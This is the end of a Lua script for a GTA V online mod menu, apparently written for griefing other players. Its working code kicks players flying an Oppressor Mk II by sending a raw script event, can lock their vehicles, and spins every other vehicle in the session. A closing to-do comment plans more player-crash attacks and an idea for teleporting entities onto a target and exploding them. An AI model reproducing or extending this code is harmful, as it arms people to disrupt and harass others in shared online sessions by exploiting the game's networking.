		end
		
		
		
		
		
		--for oppressor blacklist
		if kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
			local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
			local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
			if vehicle then
				local hash = util.joaat("oppressor2")
				if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
				util.trigger_script_event(1 << v, {-1333236192})
				if lock_vehicle then
					VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
				end
				end
			end
			end
		end






		-- vehicle spinbot
		if spinbot_vehicles then
			local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
			for_table_do(util.get_all_vehicles(),true,function(ent) 
				if ent == local_veh then return end
				ENTITY.SET_ENTITY_ROTATION(ent, 0, 0, rotation, 0, 0)
			end)
			rotation = rotation + 20
			if rotation >= 360 then
				rotation = 0
			end
		end






		util.yield()
	end
end

while true do
	-- for orbliterate
	orbital_cannon_effects(NETWORK.NETWORK_IS_IN_SPECTATOR_MODE())
	util.yield(1000)
end

----------------------------------------------------------------------------------------- TO DO LIST ------------------------------------------------------------------------------------------------
--[[





-----------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------------------------------
invalid task crash -- even tho completely useless now, still cool to have I guess?
-----------------------------------------------------------------------------------------------------------------
improve become monke -- bodyguarding go brr, also send monkes to target
-----------------------------------------------------------------------------------------------------------------
the god of flood crashes - randomized peds, vehicles, objects all flooded at same time
idea: how about teleporting every entity in the area to target player, then blowing them up? was something I did by accident once before using paragone :(
-----------------------------------------------------------------------------------------------------------------




]]